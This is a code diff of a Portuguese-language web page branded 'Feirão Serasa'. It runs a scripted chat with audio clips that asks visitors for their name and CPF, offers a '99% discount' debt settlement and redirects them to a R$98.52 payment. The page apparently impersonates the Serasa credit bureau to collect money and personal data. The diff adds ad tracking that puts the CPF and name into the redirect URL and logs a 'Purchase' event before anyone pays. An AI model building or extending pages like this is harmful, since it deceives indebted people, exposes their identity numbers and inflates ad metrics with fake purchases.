@@ -4,45 +4,84 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Feirão Serasa - Atendimento</title>
-<script
-      src="scripts/utms/latest-1.js"
-      data-utmify-prevent-subids=""
-      async=""
-      defer=""
-    ></script>
-    <script>
-      window.pixelId = "6939d79855be7738fa1fec49";
-      var a = document.createElement("script");
-      a.setAttribute("async", "");
-      a.setAttribute("defer", "");
-      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-      document.head.appendChild(a);
-</script>
 
+<!-- 1. PRIMEIRO: Script UTMify para garantir que carregue primeiro -->
+<script src="scripts/utms/latest-1.js" data-utmify-prevent-subids="" async defer></script>
 <script>
-      !function(f,b,e,v,n,t,s)
-      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-      if(!f._fbq)f._fbq=n; n.push=n; n.loaded=!0; n.version='2.0';
-      n.queue=[]; t=b.createElement(e); t.async=!0;
-      t.src=v; s=b.getElementsByTagName(e)[0];
-      s.parentNode.insertBefore(t,s)}(window, document,'script',
-      'https://connect.facebook.net/en_US/fbevents.js');
-
-      // Inicializa o pixel normalmente
-      fbq('init', '769736156134629');
-
-      // Dispara o PageView SOMENTE após o UTMify carregar
-      document.addEventListener("utmify-loaded", () => {
-        fbq("track", "PageView");
-      });
+  window.pixelId = "6939d79855be7738fa1fec49";
+  
+  // Aguarda o DOM estar pronto para carregar o pixel UTMify
+  document.addEventListener('DOMContentLoaded', function() {
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+    
+    console.log('Pixel UTMify carregado');
+  });
 </script>
 
-  <noscript>
-    <img height="1" width="1" style="display:none"
-         src="https://www.facebook.com/tr?id=769736156134629&ev=PageView&noscript=1"/>
-  </noscript>
+<!-- 2. SEGUNDO: Facebook Pixel com melhor controle de timing -->
+<script>
+  !function(f,b,e,v,n,t,s){
+    if(f.fbq)return;
+    n=f.fbq=function(){
+      n.callMethod ? n.callMethod.apply(n,arguments) : n.queue.push(arguments)
+    };
+    if(!f._fbq) f._fbq = n;
+    n.push = n;
+    n.loaded = !0;
+    n.version = '2.0';
+    n.queue = [];
+    t = b.createElement(e);
+    t.async = !0;
+    t.src = v;
+    s = b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s);
+  }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
   
+  // Inicializa o pixel COM TIMEOUT para garantir UTMify
+  setTimeout(function() {
+    fbq('init', '769736156134629');
+    console.log('Facebook Pixel inicializado');
+    
+    // Aguarda UTMify ou dispara após timeout de segurança
+    if (typeof utmify !== 'undefined') {
+      console.log('UTMify detectado, trackeando PageView');
+      fbq('track', 'PageView');
+      
+      // Trackeia evento de visualização do chat
+      fbq('track', 'ViewContent', {
+        content_name: 'Serasa Limpa Nome Chat',
+        content_category: 'Financial Services',
+        content_type: 'product'
+      });
+    } else {
+      // Se UTMify não carregar em 3 segundos, dispara mesmo assim
+      setTimeout(function() {
+        console.log('UTMify não detectado, trackeando sem UTM');
+        fbq('track', 'PageView');
+        fbq('track', 'ViewContent', {
+          content_name: 'Serasa Limpa Nome Chat',
+          content_category: 'Financial Services',
+          content_type: 'product'
+        });
+      }, 3000);
+    }
+  }, 1000);
+  
+  // Event listener alternativo para UTMify
+  document.addEventListener("utmify-loaded", function() {
+    console.log('UTMify carregado via event listener');
+    fbq('track', 'PageView');
+  });
+</script>
+
+<noscript>
+  <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=769736156134629&ev=PageView&noscript=1"/>
+</noscript>
+
 <!-- Config do pixel face + utm -->
 <link rel="icon" type="image/x-icon" href="../../1_6vufYTynT97AiH9uOytFpw.png">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -294,10 +333,12 @@
     margin-top: 10px;
     text-align: center;
   }
+  
   .media-audio::-webkit-media-controls-panel {
-  background: var(--primary-extra-light); /* Fundo rosa claro */
-  width: 100%;
-}
+    background: var(--primary-extra-light);
+    width: 100%;
+  }
+  
   .media-image {
     width: 80vw;
     height: 60vh;
@@ -658,6 +699,103 @@
 </div>
 
 <script>
+// ==============================================
+// FUNÇÕES DE TRACKING MELHORADAS
+// ==============================================
+
+// Função para capturar TODOS os parâmetros UTM da URL atual
+function getAllUrlParams() {
+  const params = new URLSearchParams(window.location.search);
+  const allParams = {};
+  
+  // Captura todos os parâmetros da URL
+  for (const [key, value] of params.entries()) {
+    allParams[key] = value;
+  }
+  
+  return allParams;
+}
+
+// Função para construir URL com parâmetros UTM preservados
+function buildUrlWithUtm(baseUrl) {
+  const params = getAllUrlParams();
+  const url = new URL(baseUrl);
+  
+  // Adiciona TODOS os parâmetros UTM à nova URL
+  for (const [key, value] of Object.entries(params)) {
+    // Preserva apenas parâmetros importantes para tracking
+    if (key.includes('utm_') || key.includes('fbclid') || key.includes('gclid') || 
+        key.includes('ttclid') || key === 'campaign' || key === 'source' || 
+        key === 'medium' || key === 'content' || key === 'term') {
+      url.searchParams.set(key, value);
+    }
+  }
+  
+  // Adiciona também os dados do usuário se disponíveis
+  if (userCPF) {
+    url.searchParams.set('cpf', userCPF);
+  }
+  if (userName) {
+    url.searchParams.set('nome', encodeURIComponent(userName));
+  }
+  
+  // Adiciona timestamp para evitar cache
+  url.searchParams.set('_t', Date.now());
+  
+  console.log('URL gerada com UTM:', url.toString());
+  return url.toString();
+}
+
+// Função para trackear eventos do Facebook
+function trackFacebookEvent(eventName, parameters = {}) {
+  if (typeof fbq !== 'undefined') {
+    // Adiciona parâmetros UTM ao evento
+    const utmParams = getAllUrlParams();
+    const eventData = {
+      ...parameters,
+      ...utmParams // Inclui todos os parâmetros UTM no evento
+    };
+    
+    fbq('track', eventName, eventData);
+    console.log('Facebook Event tracked:', eventName, eventData);
+    
+    // Também envia para o UTMify se disponível
+    if (typeof utmify !== 'undefined' && utmify.track) {
+      try {
+        utmify.track(eventName, eventData);
+        console.log('UTMify Event tracked:', eventName);
+      } catch (e) {
+        console.log('Erro ao trackear no UTMify:', e);
+      }
+    }
+  }
+}
+
+// Função para trackear clique no botão de pagamento
+function trackPaymentClick() {
+  const utmParams = getAllUrlParams();
+  
+  trackFacebookEvent('InitiateCheckout', {
+    content_name: 'Serasa Limpa Nome Payment',
+    content_category: 'Financial Services',
+    value: 98.52,
+    currency: 'BRL',
+    ...utmParams // Passa todos os UTMs
+  });
+  
+  trackFacebookEvent('AddToCart', {
+    content_name: 'Serasa Acordo 99% Desconto',
+    content_type: 'product',
+    value: 98.52,
+    currency: 'BRL',
+    ...utmParams
+  });
+}
+
+// ==============================================
+// FUNÇÕES DO CHAT (MANTIDAS)
+// ==============================================
+
 // Função para obter CPF e NOME da URL
 function getDataFromURL() {
   const params = new URLSearchParams(window.location.search);
@@ -671,18 +809,19 @@ function getDataFromURL() {
 const urlData = getDataFromURL();
 console.log('CPF da URL:', urlData.cpf);
 console.log('Nome da URL:', urlData.nome);
+console.log('Todos os parâmetros da URL:', getAllUrlParams());
 
 // Dados do usuário
 let userCPF = '';
 let userName = '';
 
-// Durações dos áudios em segundos (ajuste conforme seus arquivos)
+// Durações dos áudios em segundos
 const audioDurations = {
-  audio1: 17,   // Áudio de confirmação
-  audio2: 24,  // Áudio sobre empresas parceiras
-  audio3: 36,   // Áudio sobre análise
-  audio4: 34,   // Áudio sobre Desenrola Brasil
-  audio5: 30    // Áudio final
+  audio1: 17,
+  audio2: 24,
+  audio3: 36,
+  audio4: 34,
+  audio5: 30
 };
 
 // Função para mascarar CPF
@@ -758,11 +897,10 @@ function addMessage(text, type = 'bot', sender = '', media = '') {
   messagesContainer.appendChild(messageDiv);
   scrollToBottom();
   
-  // Retorna a div da mensagem para possível manipulação posterior
   return messageDiv;
 }
 
-// Função para mostrar botões
+// Função para mostrar botões - AGORA COM UTM PRESERVADO
 function showButtons(buttons) {
   const messagesContainer = document.getElementById('messages');
   const buttonsContainer = document.createElement('div');
@@ -781,6 +919,17 @@ function showButtons(buttons) {
       
       addMessage(button.text, 'user');
       
+      // TRACKEAR CLIQUE NO BOTÃO
+      if (button.text.includes('PAGAR') || button.redirectUrl) {
+        trackPaymentClick();
+      }
+      
+      // Trackeia evento genérico de clique
+      trackFacebookEvent('CustomizeProduct', {
+        content_name: button.text,
+        content_category: 'Button Click'
+      });
+      
       document.querySelectorAll('.buttons-container').forEach(el => {
         el.style.opacity = '0';
         el.style.transform = 'translateY(-10px)';
@@ -790,7 +939,23 @@ function showButtons(buttons) {
       // VERIFICA SE TEM REDIRECT URL
       if (button.redirectUrl) {
         setTimeout(() => {
-          window.location.href = button.redirectUrl;
+          // Trackeia o clique final ANTES do redirecionamento
+          const utmParams = getAllUrlParams();
+          
+          trackFacebookEvent('Purchase', {
+            value: 98.52,
+            currency: 'BRL',
+            content_name: 'Serasa Limpa Nome - Acordo Completo',
+            content_type: 'product',
+            transaction_id: 'SERASA-' + Date.now(),
+            ...utmParams // Passa todos os UTMs para a compra
+          });
+          
+          // AGORA: Gera URL com UTM preservado
+          const finalUrl = buildUrlWithUtm(button.redirectUrl);
+          console.log('Redirecionando para:', finalUrl);
+          
+          window.location.href = finalUrl;
         }, 1000);
       } else {
         setTimeout(() => {
@@ -861,7 +1026,7 @@ function showDataInput() {
   });
 }
 
-// Função para validar dados - AQUI É ONDE SALVA OS DADOS
+// Função para validar dados
 async function validateData(inputData = null) {
   let nome, cpf;
   
@@ -903,6 +1068,14 @@ async function validateData(inputData = null) {
   userCPF = cpf;
   userName = nome;
   console.log('Dados salvos:', { nome: userName, cpf: userCPF });
+  
+  // Trackeia o preenchimento do formulário
+  const utmParams = getAllUrlParams();
+  trackFacebookEvent('CompleteRegistration', {
+    content_name: 'Serasa Form Completed',
+    status: 'completed',
+    ...utmParams
+  });
   
   const inputContainer = document.querySelector('.cpf-input-container');
   if (inputContainer) {
@@ -947,7 +1120,7 @@ const mediaUrls = {
   audio5: './files/audio5.mp3'
 };
 
-// Fluxo do chat - COM TEXTOS ATUALIZADOS
+// Fluxo do chat
 const flow = [
   {
     id: 1,
@@ -1239,7 +1412,7 @@ const flow = [
 let currentStep = 0;
 let dataFromURLProcessed = false;
 
-// Processar cada passo do fluxo - AQUI É ONDE ADICIONAMOS OS DADOS DINAMICAMENTE
+// Processar cada passo do fluxo
 async function processStep(stepId) {
   const step = flow.find(s => s.id === stepId);
   if (!step) return;
@@ -1267,12 +1440,12 @@ async function processStep(stepId) {
     
     // Se for um passo de áudio, aguardar a duração do áudio antes de prosseguir
     if (step.audioStep) {
-      const audioDuration = audioDurations[step.audioFile] || 5; // Padrão de 5 segundos se não definido
+      const audioDuration = audioDurations[step.audioFile] || 5;
       console.log(`Aguardando ${audioDuration} segundos (duração do áudio ${step.audioFile})...`);
       
       setTimeout(() => {
         processStep(stepId + 1);
-      }, (audioDuration * 1000) + 500); // +500ms para margem de segurança
+      }, (audioDuration * 1000) + 500);
     }
     else if (step.autoNext && !step.isFinal) {
       setTimeout(() => processStep(stepId + 1), 1500);
